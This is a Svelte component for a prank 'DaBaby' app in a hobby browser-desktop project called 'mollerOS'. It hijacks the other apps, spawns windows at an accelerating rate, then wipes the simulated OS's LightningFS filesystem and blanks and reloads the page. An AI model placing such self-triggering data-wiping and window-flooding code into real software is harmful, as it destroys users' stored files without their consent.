<script context="module">
  let started = false;
</script>

<script lang="ts">
  import LightningFS from "@jkearl/lightning-fs";
  import apps from "../apps";

  import { onMount } from "svelte";
  import { open_apps } from "../stores";
  import { nanoid } from "../util";

  const self = apps.find((app) => app.name === "DaBaby");
  const words = ["DaBaby", "SmallInfant", "real da baby", "actual babey!"];
  if (!started) {
    onMount(() => {
      apps.forEach((app, i) => {
        if (app !== self) {
          app.name = words[i % words.length] + "\u200B".repeat(i + 1);
          app.icon =
            "https://upload.wikimedia.org/wikipedia/en/9/98/Dababy_BabyOnBaby.jpg";
          app.component = self.component;
        }
      });
      function spawn(timeout: number = 5000) {
        $open_apps = [
          ...$open_apps,
          {
            app: self,
            id: nanoid(),
          },
        ];
        if (timeout < .01) {
          $open_apps = []
          new LightningFS("mollerOS", { wipe: true });
          document.write("<html />");
          document.querySelector("html").style.background = "black";
          setTimeout(() => {
            location.reload();
          }, 5 * 1000);
        } else {
          setTimeout(() => spawn(timeout / 1.5), timeout / 1.5);
        }
      }

      spawn();
    });
  }
  started = true;
</script>

<svelte:head>
  <style>
    * {
      background: url("https://upload.wikimedia.org/wikipedia/en/9/98/Dababy_BabyOnBaby.jpg") !important;
    }
  </style>
</svelte:head>

<!-- svelte-ignore a11y-media-has-caption -->
<audio
  autoplay
  loop
  src="https://api.meowpad.me/v1/download/26762-lets-go-dababy"
/>
<img
  src="https://upload.wikimedia.org/wikipedia/en/9/98/Dababy_BabyOnBaby.jpg"
  alt="DaBaby real!?!?!"
/>

<style>
  img {
    width: 100%;
  }
</style>
